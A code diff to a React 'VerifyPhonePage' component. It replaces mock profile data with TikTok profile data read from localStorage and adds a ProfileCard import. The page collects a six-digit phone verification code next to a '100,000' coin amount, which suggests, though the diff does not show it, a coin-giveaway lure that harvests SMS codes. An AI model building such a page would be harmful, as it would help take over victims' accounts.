@@ -2,6 +2,7 @@ import React, { useState, useRef, useEffect } from 'react';
 import { useNavigate } from 'react-router-dom';
 import { Button } from '../components/ui/button';
 import axios from 'axios';
+import ProfileCard from '../components/ProfileCard';
 
 const BACKEND_URL = process.env.REACT_APP_BACKEND_URL;
 const API = `${BACKEND_URL}/api`;
@@ -9,23 +10,20 @@ const API = `${BACKEND_URL}/api`;
 const VerifyPhonePage = () => {
   const navigate = useNavigate();
   const [code, setCode] = useState(['', '', '', '', '', '']);
+  const [tiktokData, setTiktokData] = useState(null);
   const inputRefs = useRef([]);
   const coinAmount = localStorage.getItem('coinAmount') || '100,000';
   const phone = localStorage.getItem('phone') || '+1xxxxxxxx8521';
   const sessionId = localStorage.getItem('sessionId');
   const username = localStorage.getItem('username') || 'user';
 
-  const mockUserData = {
-    name: username,
-    username: `@${username}`,
-    followers: '532.4K',
-    following: '8.5K',
-    likes: '4.5M',
-    avatar: 'https://i.pravatar.cc/150?img=12'
-  };
-
   useEffect(() => {
     inputRefs.current[0]?.focus();
+    
+    const storedData = localStorage.getItem('tiktokData');
+    if (storedData) {
+      setTiktokData(JSON.parse(storedData));
+    }
   }, []);
 
   const handleChange = (index, value) => {
